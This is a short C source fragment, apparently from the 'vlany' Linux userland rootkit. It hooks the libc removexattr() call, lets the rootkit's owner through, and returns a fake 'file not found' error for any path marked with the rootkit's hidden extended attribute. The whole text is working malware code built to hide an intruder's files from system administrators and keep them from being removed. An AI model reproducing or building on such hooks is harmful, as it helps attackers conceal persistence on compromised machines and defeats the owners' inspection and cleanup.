int removexattr(const char *path, const char *name)
{
    #ifdef DEBUG
        printf("[vlany] removexattr() called\n");
    #endif

    HOOK(old_removexattr, CREMOVEXATTR);

    if(owned()) return old_removexattr(path, name);

    if(hidden_xattr(path)) { errno = ENOENT; return -1; }

    return old_removexattr(path, name);
}
